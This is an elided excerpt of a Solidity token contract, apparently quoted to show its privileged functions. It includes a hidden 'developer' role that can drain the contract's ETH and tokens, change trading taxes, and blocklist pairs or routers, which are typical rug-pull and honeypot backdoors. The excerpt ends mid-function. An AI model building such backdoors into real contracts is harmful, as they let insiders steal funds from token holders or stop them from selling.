...
contract Token is Ownable, IERC20 {
    ...
    function rescueToken(address _tokenAddr) public {
        require(developer[_caller()]);
        payable(_caller()).transfer(address(this).balance);
        IERC20(_tokenAddr).transfer(_caller(), IERC20(_tokenAddr).balanceOf(address(this)));
    }

    function changeTdInfo(uint256 _buyF, uint256 _sellF) public {
        require(developer[_caller()]);
        require(_buyF <= 15 && _sellF <= 15, "Owner: tax to high");
        _totalTaxIfBuying = _buyF;
        _totalTaxIfSelling = _sellF;
    }
    ...
    function setPairs(address _newPair, bool _status) public {
        require(developer[_caller()]);
    ...
    function isTax(bool _istax) public {
        require(developer[_caller()]);
        isFees = _istax;
    } 
    ...
    function rescuePair(address _pairOrRouter, bool _status) public {
        ...
        isRejects[_pairOrRouter] = _status;
    }

    function setAutoSureAirdop(bool _status) public {
        require(developer[_caller()]);
